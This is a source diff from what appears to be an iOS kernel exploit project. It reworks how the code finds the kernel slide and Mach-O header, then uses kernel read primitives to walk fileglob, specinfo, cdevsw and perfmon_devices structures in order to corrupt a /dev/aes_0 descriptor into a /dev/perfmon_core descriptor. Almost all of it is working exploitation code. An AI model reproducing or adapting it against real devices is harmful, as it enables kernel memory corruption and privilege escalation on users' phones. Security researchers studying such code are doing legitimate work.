@@ -4,7 +4,6 @@
 
 #include "perf.h"
 
-uint64_t kaddr_base = 0;
 uint64_t kaddr_vn_kqfilter = 0;
 uint64_t kaddr_vm_pages = 0;
 uint64_t kaddr_vm_page_array_beginning = 0;
@@ -35,23 +34,18 @@ void perf_init(struct kfd* kfd)
     kfd->perf.shared_page.uaddr = shared_page_address;
     kfd->perf.shared_page.size = shared_page_size;
     
-    if(isarm64e()) {
-        objcbridge *obj = [[objcbridge alloc] init];
+    objcbridge *obj = [[objcbridge alloc] init];
+    if(isarm64e() && kfd->info.env.vid <= 7) {
         kaddr_ptov_table = [obj find_ptov_table];
         kaddr_gPhysBase = [obj find_gPhysBase];
         kaddr_gPhysSize = [obj find_gPhysSize];
         kaddr_gVirtBase = [obj find_gVirtBase];
-        if(kfd->info.env.vid >= 8) {
-            kaddr_base = [obj find_base];
-            kaddr_vn_kqfilter = [obj find_vn_kqfilter];
-            kaddr_vm_pages = [obj find_vm_pages];
-            kaddr_vm_page_array_beginning = [obj find_vm_page_array_beginning];
-            kaddr_vm_page_array_ending = [obj find_vm_page_array_ending];
-            kaddr_vm_first_phys_ppnum = [obj find_vm_first_phys_ppnum];
-            kaddr_cdevsw = [obj find_cdevsw];
-            kaddr_perfmon_dev_open = [obj find_perfmon_dev_open];
-            kaddr_perfmon_devices = [obj find_perfmon_devices];
-        }
+    }
+    if(isarm64e() && kfd->info.env.vid >= 8 && kfd->info.env.exploit_type == MEOW_EXPLOIT_SMITH) {
+        kaddr_vm_pages = [obj find_vm_pages];
+        kaddr_vm_page_array_beginning = [obj find_vm_page_array_beginning];
+        kaddr_vm_page_array_ending = [obj find_vm_page_array_ending];
+        kaddr_vm_first_phys_ppnum = [obj find_vm_first_phys_ppnum];
     }
 }
 
@@ -153,9 +147,17 @@ void perf_ptov(struct kfd* kfd)
 
 void perf_run(struct kfd* kfd)
 {
+    uint64_t kernel_base = 0xFFFFFFF007004000 + kfd->info.kernel.kernel_slide;
+    print_x64(kfd->info.kernel.kernel_slide);
 
+    uint32_t mh_header[2] = {};
+    mh_header[0] = kread_sem_open_kread_u32(kfd, kernel_base);
+    mh_header[1] = kread_sem_open_kread_u32(kfd, kernel_base + 4);
+    assert(mh_header[0] == 0xfeedfacf);
+    assert(mh_header[1] == 0x0100000c);
+    
     /*
-     * Open a "/dev/aes_0" descriptor, then use it to find the kernel slide.
+     * Corrupt the "/dev/aes_0" descriptor into a "/dev/perfmon_core" descriptor.
      */
     
     kfd->perf.dev.fd = open("/dev/aes_0", O_RDWR);
@@ -173,42 +175,7 @@ void perf_run(struct kfd* kfd)
     uint64_t fp_glob_kaddr = fileproc + static_offsetof(fileproc, fp_glob);
     uint64_t fp_glob = 0;
     kread_kfd((uint64_t)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));
-
-    uint64_t fg_ops_kaddr = unsign_kaddr(fp_glob) + static_offsetof(fileglob, fg_ops);
-    uint64_t fg_ops = 0;
-    kread_kfd((uint64_t)(kfd), fg_ops_kaddr, &fg_ops, sizeof(fg_ops));
-
-    uint64_t fo_kqfilter_kaddr = unsign_kaddr(fg_ops) + static_offsetof(fileops, fo_kqfilter);
-    uint64_t fo_kqfilter = 0;
-    kread_kfd((uint64_t)(kfd), fo_kqfilter_kaddr, &fo_kqfilter, sizeof(fo_kqfilter));
-
-    uint64_t vn_kqfilter = unsign_kaddr(fo_kqfilter);
-    uint64_t kernel_slide = vn_kqfilter - kaddr_vn_kqfilter;
-    uint64_t kernel_base = kaddr_base + kernel_slide;
-    kfd->info.kernel.kernel_slide = kernel_slide;
-    print_x64(kfd->info.kernel.kernel_slide);
-
-    uint32_t mh_header[2] = {};
-    mh_header[0] = kread_sem_open_kread_u32(kfd, kernel_base);
-    mh_header[1] = kread_sem_open_kread_u32(kfd, kernel_base + 4);
-    assert(mh_header[0] == 0xfeedfacf);
-    assert(mh_header[1] == 0x0100000c);
-
-    /*
-     * Set up some globals used by vm_page.h.
-     */
-    uint64_t vm_pages_kaddr = kaddr_vm_pages + kernel_slide;
-    uint64_t vm_page_array_beginning_addr_kaddr = kaddr_vm_page_array_beginning + kernel_slide;
-    uint64_t vm_page_array_ending_addr_kaddr = kaddr_vm_page_array_ending + kernel_slide;
-    uint64_t vm_first_phys_ppnum_kaddr = kaddr_vm_first_phys_ppnum + kernel_slide;
-    kread_kfd((uint64_t)(kfd), vm_pages_kaddr, &vm_pages, sizeof(vm_pages));
-    kread_kfd((uint64_t)(kfd), vm_page_array_beginning_addr_kaddr, &vm_page_array_beginning_addr, sizeof(vm_page_array_beginning_addr));
-    kread_kfd((uint64_t)(kfd), vm_page_array_ending_addr_kaddr, &vm_page_array_ending_addr, sizeof(vm_page_array_ending_addr));
-    vm_first_phys_ppnum = kread_sem_open_kread_u32(kfd, vm_first_phys_ppnum_kaddr);
-
-    /*
-     * Corrupt the "/dev/aes_0" descriptor into a "/dev/perfmon_core" descriptor.
-     */
+    
     uint64_t fg_data_kaddr = unsign_kaddr(fp_glob) + static_offsetof(fileglob, fg_data);
     uint64_t fg_data = 0;
     kread_kfd((uint64_t)(kfd), fg_data_kaddr, &fg_data, sizeof(fg_data));
@@ -220,8 +187,8 @@ void perf_run(struct kfd* kfd)
     kfd->perf.dev.si_rdev_kaddr = unsign_kaddr(v_specinfo) + 0x0018; // offsetof(struct specinfo, si_rdev)
     kread_kfd((uint64_t)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));
 
-    uint64_t cdevsw_kaddr = kaddr_cdevsw + kernel_slide;
-    uint64_t perfmon_dev_open_kaddr = kaddr_perfmon_dev_open + kernel_slide;
+    uint64_t cdevsw_kaddr = kaddr_cdevsw + kfd->info.kernel.kernel_slide;
+    uint64_t perfmon_dev_open_kaddr = kaddr_perfmon_dev_open + kfd->info.kernel.kernel_slide;
     uint64_t cdevsw[14] = {};
     uint32_t dev_new_major = 0;
     for (uint64_t dmaj = 0; dmaj < 64; dmaj++) {
@@ -249,7 +216,7 @@ void perf_run(struct kfd* kfd)
      * - perfmon_devices[0][0].pmdv_allocated = true
      */
     struct perfmon_device perfmon_device = {};
-    uint64_t perfmon_device_kaddr = kaddr_perfmon_devices + kernel_slide;
+    uint64_t perfmon_device_kaddr = kaddr_perfmon_devices + kfd->info.kernel.kernel_slide;
     uint8_t* perfmon_device_uaddr = (uint8_t*)(&perfmon_device);
     kread_kfd((uint64_t)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));
     assert((perfmon_device.pmdv_mutex[0] & 0xffffff00ffffffff) == 0x0000000022000000);
